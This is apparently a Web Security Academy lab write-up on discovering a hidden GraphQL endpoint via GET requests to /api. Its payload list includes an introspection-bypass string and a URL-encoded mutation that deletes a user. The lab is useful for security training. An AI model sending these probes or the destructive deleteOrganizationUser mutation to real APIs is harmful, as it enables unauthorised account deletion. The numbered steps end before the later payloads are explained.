## Finding a hidden GraphQL endpoint

**Category:** graphql
**Difficulty:** Unknown

### Description
The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

### Solution Steps
1. In Repeater, send requests to some common GraphQL endpoint suffixes and inspect the results.
2. Note that when you send a GET request to /api the response contains a "Query not present" error. This hints that there may be a GraphQL endpoint responding to GET requests at this location.
3. Amend the request to contain a universal query. Note that, because the endpoint is responding to GET requests, you need to send the query as a URL parameter. For example: /api?query=query{__typename} .
4. Notice that the response confirms that this is a GraphQL endpoint: {
  "data": {
    "__typename": "query"
  }
}

### Key Payloads
- `carlos`
- `/api`
- `/api?query=query{__typename}`
- `{
  "data": {
    "__typename": "query"
  }
}`
- `__schema`
- `"__schema{"`
- `getUser`
- `{
"data": {
"getUser": null
}
}`
- `deleteOrganizationUser`
- `/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: graphql

---
*Source: PortSwigger Web Security Academy*
